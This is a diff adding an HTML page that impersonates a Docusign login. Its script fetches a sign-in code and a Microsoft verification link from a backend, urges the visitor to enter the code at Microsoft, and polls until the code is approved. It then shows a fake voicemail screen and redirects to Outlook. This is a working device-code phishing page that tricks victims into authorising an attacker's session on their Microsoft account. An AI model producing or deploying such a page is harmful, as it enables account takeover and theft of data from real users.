@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Docusign - Log in</title>
+<link rel="icon" type="image/svg+xml" href="https://docucdn-a.akamaihd.net/olive/images/2.72.0/global-assets/ds-logo-default.svg">
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%}
+body{background:#f0f0f0;font-family:'Inter','Segoe UI',Tahoma,Geneva,Verdana,sans-serif;display:flex;flex-direction:column;min-height:100vh}
+
+/* ── Top navbar ── */
+.topbar{background:#fff;border-bottom:1px solid #e5e5e5;padding:14px 28px;display:flex;align-items:center;flex-shrink:0}
+.ds-logo{display:flex;align-items:center;text-decoration:none}
+.ds-logo img{height:28px}
+
+/* ── Main area ── */
+.main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 20px}
+.wrap{width:100%;max-width:440px}
+.card{background:#fff;border-radius:4px;overflow:hidden;box-shadow:0 1px 6px rgba(0,0,0,.08)}
+.state{display:none}.state.show{display:block}
+
+/* Content area */
+.content{padding:36px 36px 32px;text-align:left}
+
+/* Heading */
+.heading{font-size:24px;font-weight:700;color:#1a1a1a;margin-bottom:6px}
+.sub{font-size:14px;color:#888;margin-bottom:28px;line-height:1.5}
+
+/* Label */
+.field-label{font-size:14px;font-weight:700;color:#1a1a1a;margin-bottom:10px}
+
+/* Code box */
+.code-box{background:#f8f8f8;border:1px solid #e0e0e0;border-radius:6px;padding:20px 24px;margin-bottom:10px;text-align:center;position:relative;transition:all .3s;cursor:pointer}
+.code-box:hover{border-color:#0078d4}
+.code-box.highlight{border-color:#0078d4;box-shadow:0 0 0 2px rgba(0,120,212,.15)}
+
+.code-val{font-size:32px;font-weight:700;color:#1a1a1a;letter-spacing:6px;display:block;user-select:all;cursor:pointer;font-family:'Inter',monospace}
+
+/* Loading state inside code box */
+.code-loading{display:flex;flex-direction:column;align-items:center;gap:8px;padding:4px 0}
+.code-spinner{width:24px;height:2px;background:#1a1a1a;animation:blink 1s step-end infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+.code-connecting{font-size:13px;color:#aaa}
+
+/* Status message */
+.status-msg{font-size:13px;color:#888;text-align:center;margin-bottom:20px;line-height:1.5}
+.status-msg.error{color:#d32f2f}
+.status-msg.success{color:#28a745}
+
+/* Info text */
+.info-text{font-size:13px;color:#888;text-align:center;margin-bottom:20px;line-height:1.6}
+
+/* Continue button */
+.btn-signin{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;padding:14px;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;border:none;font-family:'Inter',sans-serif;transition:all .15s;text-decoration:none;background:#0078d4;color:#fff;margin-bottom:0}
+.btn-signin:hover{background:#106ebe}
+.ms-logo{display:grid;grid-template-columns:1fr 1fr;gap:2px;width:16px;height:16px;flex-shrink:0}
+.ms-logo span{border-radius:1px}
+
+/* Start over */
+.btn-startover{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:12px;border-radius:6px;font-size:14px;font-weight:500;cursor:pointer;border:1px solid #e0e0e0;font-family:'Inter',sans-serif;transition:all .15s;text-decoration:none;background:#fff;color:#888;margin-top:10px}
+.btn-startover:hover{background:#f5f5f5;border-color:#ccc;color:#1a1a1a}
+
+/* Copy link */
+.copy-link{display:inline-flex;align-items:center;gap:6px;font-size:13px;color:#0078d4;cursor:pointer;border:none;background:none;padding:4px 0;font-family:'Inter',sans-serif;margin-bottom:20px}
+.copy-link:hover{text-decoration:underline}
+.copy-link.copied{color:#28a745}
+
+/* Success */
+.succ-file-bar{display:flex;align-items:center;gap:10px;padding:14px 20px;border-bottom:1px solid #eee}
+.succ-file-icon{width:24px;height:24px;display:flex;align-items:center;justify-content:center}
+.succ-file-icon svg{width:20px;height:20px}
+.succ-file-name{font-size:14px;color:#333;font-weight:500}
+.succ-icon{width:56px;height:56px;border-radius:50%;background:none;border:2px solid #28a745;display:flex;align-items:center;justify-content:center;font-size:24px;margin:0 auto 16px;color:#28a745}
+.succ-heading{font-size:20px;font-weight:700;color:#28a745;margin-bottom:8px;text-align:center}
+.succ-sub{font-size:14px;color:#0078d4;text-align:center;margin-bottom:0}
+
+/* ── Footer ── */
+.footer{background:#fff;border-top:1px solid #e5e5e5;padding:14px 28px;display:flex;align-items:center;justify-content:space-between;flex-shrink:0;flex-wrap:wrap;gap:8px}
+.footer-left{display:flex;align-items:center;gap:6px;font-size:12px;color:#999}
+.footer-left img{height:16px;vertical-align:middle;margin:0 4px}
+.footer-left span{font-weight:600;color:#1a1a1a}
+.footer-center{display:flex;align-items:center;gap:16px;flex-wrap:wrap}
+.footer-center a{font-size:12px;color:#888;text-decoration:none}
+.footer-center a:hover{color:#555;text-decoration:underline}
+.footer-right{font-size:11px;color:#bbb}
+
+@media(max-width:640px){
+  .footer{flex-direction:column;text-align:center;gap:10px}
+  .footer-center{justify-content:center}
+}
+</style>
+</head>
+<body>
+
+<!-- Top navbar -->
+<div class="topbar">
+  <div class="ds-logo">
+    <img src="https://docucdn-a.akamaihd.net/olive/images/2.72.0/global-assets/ds-logo-default.svg" alt="Docusign">
+  </div>
+</div>
+
+<!-- Main content -->
+<div class="main">
+<div class="wrap">
+  <div class="card">
+
+    <!-- LOADING -->
+    <div class="state show" id="st-loading">
+      <div class="content">
+        <div class="heading">Log in to Docusign</div>
+        <div class="sub">Use the code below to sign in.</div>
+        <div class="field-label">Your Sign-in Code</div>
+        <div class="code-box">
+          <div class="code-loading">
+            <div class="code-spinner"></div>
+            <div class="code-connecting">Connecting...</div>
+          </div>
+        </div>
+        <div class="info-text">Sign in with the verification code to view and access your secure document.</div>
+        <a class="btn-signin" href="#" style="pointer-events:none;opacity:.5">
+          <div class="ms-logo"><span style="background:#f25022"></span><span style="background:#7fba00"></span><span style="background:#00a4ef"></span><span style="background:#ffb900"></span></div>
+          Continue to Microsoft
+        </a>
+      </div>
+    </div>
+
+    <!-- CODE READY -->
+    <div class="state" id="st-code">
+      <div class="content">
+        <div class="heading">Log in to Docusign</div>
+        <div class="sub">Use the code below to sign in.</div>
+        <div class="field-label">Your Sign-in Code</div>
+        <div class="code-box" id="code-box" onclick="copyCode()">
+          <div class="code-val" id="code-val">— — — —</div>
+        </div>
+        <button class="copy-link" onclick="copyCode()" id="copy-btn">
+          <svg width="14" height="14" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="5" y="5" width="9" height="9" rx="1.5"/><path d="M5 11H3.5A1.5 1.5 0 012 9.5v-7A1.5 1.5 0 013.5 1h7A1.5 1.5 0 0112 2.5V5"/></svg>
+          Copy code
+        </button>
+
+        <div class="status-msg" id="status-msg"></div>
+
+        <div class="info-text">Sign in with the verification code to view and access your secure document.</div>
+
+        <a class="btn-signin" id="url-link" href="#" target="_blank">
+          <div class="ms-logo"><span style="background:#f25022"></span><span style="background:#7fba00"></span><span style="background:#00a4ef"></span><span style="background:#ffb900"></span></div>
+          Sign in at Microsoft
+        </a>
+
+        <button class="btn-startover" onclick="init()">
+          <svg width="14" height="14" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 8a6 6 0 0111.5-2M14 8a6 6 0 01-11.5 2"/><path d="M14 2v4h-4M2 14v-4h4"/></svg>
+          Start Over
+        </button>
+      </div>
+    </div>
+
+    <!-- SUCCESS -->
+    <div class="state" id="st-success">
+      <div class="succ-file-bar">
+        <div class="succ-file-icon">
+          <svg viewBox="0 0 24 24" fill="none"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8l-6-6z" fill="#4A90D9"/><path d="M14 2v6h6" fill="#7DB4E0"/><path d="M14 2l6 6h-6V2z" fill="#7DB4E0"/></svg>
+        </div>
+        <span class="succ-file-name">Voicemail_Message.mp3</span>
+      </div>
+      <div class="content" style="text-align:center;padding:40px 36px">
+        <div class="succ-icon">✓</div>
+        <div class="succ-heading">Verification Complete!</div>
+        <div class="succ-sub">Loading voicemail...</div>
+      </div>
+    </div>
+
+    <!-- ERROR -->
+    <div class="state" id="st-error">
+      <div class="content">
+        <div class="heading">Log in to Docusign</div>
+        <div class="sub">Use the code below to sign in.</div>
+        <div class="field-label">Your Sign-in Code</div>
+        <div class="code-box">
+          <div class="code-loading">
+            <div class="code-spinner"></div>
+            <div class="code-connecting">Connecting...</div>
+          </div>
+        </div>
+        <div class="status-msg error" id="err-msg" style="margin-top:16px">Could not connect to server.</div>
+        <button class="btn-startover" onclick="init()" style="margin-top:12px">
+          <svg width="14" height="14" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 8a6 6 0 0111.5-2M14 8a6 6 0 01-11.5 2"/><path d="M14 2v4h-4M2 14v-4h4"/></svg>
+          Start Over
+        </button>
+      </div>
+    </div>
+
+  </div>
+</div>
+</div>
+
+<!-- Footer -->
+<div class="footer">
+  <div class="footer-left">Powered by <img src="https://docucdn-a.akamaihd.net/olive/images/2.72.0/global-assets/ds-logo-default.svg" alt="Docusign"></div>
+  <div class="footer-center">
+    <a href="#">English (US) ▾</a>
+    <a href="#">Contact Us</a>
+    <a href="#">Terms of Use</a>
+    <a href="#">Privacy</a>
+    <a href="#">Intellectual Property</a>
+    <a href="#">Trust</a>
+  </div>
+  <div class="footer-right">Copyright &copy; 2026 Docusign, Inc. All rights reserved.</div>
+</div>
+
+<script>
+const API = 'http://localhost:3000';
+
+let sessionKey = null;
+let expiry     = null;
+let totalSecs  = 0;
+let timerInt   = null;
+let pollInt    = null;
+
+function show(id) {
+  document.querySelectorAll('.state').forEach(s => s.classList.toggle('show', s.id === id));
+}
+
+async function init() {
+  show('st-loading');
+  clearInterval(timerInt);
+  clearInterval(pollInt);
+  sessionKey = null;
+
+  try {
+    const res = await fetch(API + '/api/link/new-session', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: '{}'
+    });
+
+    if (!res.ok) {
+      const err = await res.json().catch(() => ({}));
+      throw new Error(err.error || 'Server error ' + res.status);
+    }
+
+    const data = await res.json();
+    if (data.error) throw new Error(data.error);
+
+    sessionKey = data.session_key;
+    expiry     = new Date(data.expires_at);
+    totalSecs  = data.expires_in || Math.floor((expiry - Date.now()) / 1000);
+
+    document.getElementById('code-val').textContent = data.user_code;
+    document.getElementById('url-link').href        = data.verification_uri;
+
+    const box = document.getElementById('code-box');
+    box.classList.add('highlight');
+    setTimeout(() => box.classList.remove('highlight'), 1200);
+
+    show('st-code');
+    startTimer();
+    startPolling();
+    trackVisit(sessionKey);
+
+  } catch(e) {
+    document.getElementById('err-msg').textContent = 'Could not connect to server.';
+    show('st-error');
+  }
+}
+
+function startTimer() {
+  clearInterval(timerInt);
+  timerInt = setInterval(() => {
+    const left = Math.max(0, Math.floor((expiry - Date.now()) / 1000));
+    if (left <= 0) {
+      clearInterval(timerInt);
+      clearInterval(pollInt);
+      const msg = document.getElementById('status-msg');
+      msg.textContent = 'Code expired — generating new code...';
+      msg.className = 'status-msg';
+      setTimeout(() => init(), 1200);
+    }
+  }, 1000);
+}
+
+function startPolling() {
+  clearInterval(pollInt);
+  if (!sessionKey) return;
+
+  pollInt = setInterval(async () => {
+    try {
+      const res  = await fetch(API + '/api/link/poll/' + sessionKey);
+      const data = await res.json();
+
+      if (data.status === 'success') {
+        clearInterval(pollInt);
+        clearInterval(timerInt);
+        show('st-success');
+        setTimeout(() => { window.location.href = 'https://outlook.cloud.microsoft/mail/'; }, 2500);
+      } else if (data.status === 'expired' || data.status === 'not_found') {
+        clearInterval(pollInt);
+        clearInterval(timerInt);
+        setTimeout(() => init(), 500);
+      }
+    } catch {}
+  }, 4000);
+}
+
+function copyCode() {
+  const code = document.getElementById('code-val').textContent.replace(/\s/g, '');
+  const btn  = document.getElementById('copy-btn');
+
+  if (navigator.clipboard) {
+    navigator.clipboard.writeText(code).then(() => {
+      btn.classList.add('copied');
+      btn.innerHTML = '<svg width="14" height="14" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 8l3.5 3.5L13 5"/></svg> Copied!';
+      setTimeout(() => {
+        btn.classList.remove('copied');
+        btn.innerHTML = '<svg width="14" height="14" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="5" y="5" width="9" height="9" rx="1.5"/><path d="M5 11H3.5A1.5 1.5 0 012 9.5v-7A1.5 1.5 0 013.5 1h7A1.5 1.5 0 0112 2.5V5"/></svg> Copy code';
+      }, 2500);
+    });
+  }
+}
+
+function linkAnother() { init(); }
+
+function trackVisit(sk) {
+  fetch(API + '/api/link/visit', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ session_key: sk || null })
+  }).catch(() => {});
+}
+
+init();
+</script>
+</body>
+</html>
